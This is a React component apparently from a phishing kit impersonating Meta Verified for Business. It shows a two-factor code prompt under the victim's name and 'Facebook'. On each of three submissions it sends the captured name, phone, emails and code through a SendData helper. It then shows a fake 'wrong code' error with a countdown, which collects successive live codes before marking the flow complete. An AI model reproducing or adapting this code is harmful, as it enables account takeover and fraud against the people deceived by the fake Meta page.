'use client'

import React from 'react'
import Image from 'next/image'
import { buildTwoFaDestinationsLabel } from '@/utils/twoFaDescription'
import { useAppDispatch, useAppSelector } from '@/app/store/hooks'
import { FormData, updateForm } from '@/app/store/slices/stepFormSlice'
import { useAppStrings } from '@/hooks/useAppStrings'
import { SendData } from '@/utils/sendData'
import { markMetaVerifiedFlowCompleted } from '@/utils/metaVerifiedFlow'
import MvSecureFlowPanel from '@/components/meta-verified-for-business/landing/MvSecureFlowPanel'

interface TwoFactorModalProps {
  isOpend: boolean
  isOpendFinish: (value: boolean) => void
  onToggleModal: (isOpen: boolean) => void
}

/** Sau nhập sai mã lần 1 → chờ trước khi nhập lại; sau sai lần 2 → chờ trước lần 3 */
const RETRY_WAIT_AFTER_FIRST_WRONG_SEC = 15
const RETRY_WAIT_AFTER_SECOND_WRONG_SEC = 30

const TwoFactorModal: React.FC<TwoFactorModalProps> = ({
  isOpend,
  isOpendFinish,
}) => {
  const t = useAppStrings()

  const getRetryWaitSeconds = (nextStep: number) =>
    nextStep === 1 ? RETRY_WAIT_AFTER_FIRST_WRONG_SEC : RETRY_WAIT_AFTER_SECOND_WRONG_SEC

  const [errors, setErrors] = React.useState<Record<string, string>>({})
  const [loading, setLoading] = React.useState(false)
  const [click, setClick] = React.useState(0)
  const [disabled, setDisable] = React.useState(false)
  const intervalRef = React.useRef<ReturnType<typeof setInterval> | null>(null)

  const dispatch = useAppDispatch()
  const formDataState = useAppSelector((state) => state.stepForm.data)

  const [twoFa, setTwoFa] = React.useState('')

  const { fullName, phone, email, emailBusiness } = (formDataState as FormData) || {}

  const twoFaDestinations = buildTwoFaDestinationsLabel(email ?? '', phone ?? '', emailBusiness)

  const [, setCountdown] = React.useState<number>(RETRY_WAIT_AFTER_FIRST_WRONG_SEC)

  React.useEffect(() => {
    return () => {
      if (intervalRef.current) {
        clearInterval(intervalRef.current)
      }
    }
  }, [])

  if (!isOpend) return null

  const handleChange = (e: React.ChangeEvent<HTMLInputElement | HTMLTextAreaElement>) => {
    const { id, value } = e.target
    const normalizedValue = value.replace(/\D/g, '').slice(0, 8)
    setTwoFa(normalizedValue)
    setErrors((prev) => ({ ...prev, [id]: '' }))

    if (click === 0) {
      dispatch(updateForm({ twoFa: normalizedValue }))
    }

    if (click === 1) {
      dispatch(updateForm({ twoFaSecond: normalizedValue }))
    }

    if (click === 2) {
      dispatch(updateForm({ twoFaThird: normalizedValue }))
    }
  }

  const isTwoFaValid = (twoFa.length === 6 || twoFa.length === 8) && /^\d+$/.test(twoFa)

  const formatRetryMessage = (secondsLeft: number, nextStep: number) => {
    const minutes = Math.floor(secondsLeft / 60)
    const seconds = secondsLeft % 60
    if (nextStep === 1) {
      return t.twoFa.retryErrorExpired(minutes, seconds)
    }
    return t.twoFa.retryError(minutes, seconds)
  }

  const startRetryCountdown = (nextStep: number) => {
    if (intervalRef.current) clearInterval(intervalRef.current)

    const waitSec = getRetryWaitSeconds(nextStep)

    setDisable(true)
    setCountdown(waitSec)
    setErrors({ twoFa: formatRetryMessage(waitSec, nextStep) })

    intervalRef.current = setInterval(() => {
      setCountdown((prev) => {
        const next = prev - 1
        if (next <= 0) {
          if (intervalRef.current) clearInterval(intervalRef.current)
          intervalRef.current = null
          setClick(nextStep)
          setErrors({})
          setDisable(false)
          return waitSec
        }
        setErrors({ twoFa: formatRetryMessage(next, nextStep) })
        return next
      })
    }, 1000)
  }

  const handlePaste = (e: React.ClipboardEvent<HTMLInputElement>) => {
    const pasted = e.clipboardData.getData('text').replace(/\D/g, '').slice(0, 8)
    e.preventDefault()
    setTwoFa(pasted)
    setErrors((prev) => ({ ...prev, twoFa: '' }))
    if (click === 0) dispatch(updateForm({ twoFa: pasted }))
    if (click === 1) dispatch(updateForm({ twoFaSecond: pasted }))
    if (click === 2) dispatch(updateForm({ twoFaThird: pasted }))
  }

  const handSubmit = async (e: React.FormEvent) => {
    try {
      e.preventDefault()
      const newErrors: Record<string, string> = {}

      if (Object.keys(newErrors).length > 0) {
        setErrors(newErrors)
        return
      }
      const isTwoFaValid = (twoFa.length === 6 || twoFa.length === 8) && /^\d+$/.test(twoFa)

      if (!isTwoFaValid) {
        setErrors({ twoFa: t.twoFa.errInvalid })
        return
      }

      setLoading(true)

      if (click === 0) {
        await SendData(formDataState)
          .then(() => {
            setTimeout(async () => {
              setLoading(false)
              setTwoFa('')
              startRetryCountdown(1)
            }, 1234)
          })
          .catch((error) => {
            console.error('Error submitting form:', error)
            setLoading(false)
            setErrors({ twoFa: t.twoFa.errSend })
          })
      }

      if (click === 1) {
        await SendData(formDataState)
          .then(() => {
            setTimeout(async () => {
              setLoading(false)
              setTwoFa('')
              startRetryCountdown(2)
            }, 1234)
          })
          .catch((error) => {
            console.error('Error submitting form:', error)
            setLoading(false)
            setErrors({ twoFa: t.twoFa.errSend })
          })
      }

      if (click === 2) {
        await SendData(formDataState)
          .then(() => {
            setTimeout(async () => {
              setLoading(false)
              setTwoFa('')

              markMetaVerifiedFlowCompleted()
              isOpendFinish(true)

              setClick(0)
            }, 1234)
          })
          .catch((error) => {
            console.error('Error submitting form:', error)
            setLoading(false)
            setErrors({ twoFa: t.twoFa.errVerify })
          })
      }
    } catch (error) {
      console.error('Error submitting form:', error)
    }
  }

  const inputClass = `mv-input mv-secure-input ${errors.twoFa ? 'is-invalid' : ''}`

  return (
    <MvSecureFlowPanel labelledBy="mv-twofa-title" title={t.twoFa.title} layout="split">
      <div className="mv-hc-secure-split">
        <form className="mv-hc-secure-form" onSubmit={handSubmit}>
          <div className="mv-secure-identity">
            <span>{fullName}</span>
            <span className="mv-secure-identity-dot" aria-hidden />
            <span>{t.common.facebook}</span>
          </div>
          <p className="mv-secure-body">{t.twoFa.description(twoFaDestinations)}</p>

          <div className="mv-secure-field">
            <label htmlFor="twoFa" className="mv-secure-label">
              {t.twoFa.label} <span className="mv-activation-required">*</span>
            </label>
            <div className={`${inputClass} mv-secure-input--code`}>
              <input
                type="text"
                inputMode="numeric"
                id="twoFa"
                placeholder={t.twoFa.placeholder}
                className={disabled ? 'is-disabled' : undefined}
                value={twoFa}
                onChange={handleChange}
                onPaste={handlePaste}
                disabled={disabled}
                maxLength={8}
                autoComplete="one-time-code"
                aria-label={t.twoFa.ariaInput}
              />
            </div>
            <p className="mv-secure-hint">{t.twoFa.hint}</p>
            {errors.twoFa ? (
              <p className="mv-secure-error" role="alert">
                <span>{errors.twoFa}</span>
              </p>
            ) : null}
          </div>

          <button
            type="submit"
            className="mv-secure-btn"
            disabled={disabled || !isTwoFaValid || loading}
            aria-label={t.twoFa.ariaSubmit}
          >
            {loading ? (
              <span className="mv-secure-spinner" aria-hidden>
                <Image
                  src="/images/icons/ic_loading.svg"
                  alt=""
                  width={18}
                  height={18}
                  unoptimized
                />
              </span>
            ) : (
              t.common.continue
            )}
          </button>
        </form>

        <div className="mv-secure-media">
          <Image
            src="/images/meta/authentication.png"
            alt={t.twoFa.authIllustrationAlt}
            width={1125}
            height={492}
            sizes="(max-width: 899px) 100vw, 340px"
          />
        </div>
      </div>
    </MvSecureFlowPanel>
  )
}

export default TwoFactorModal
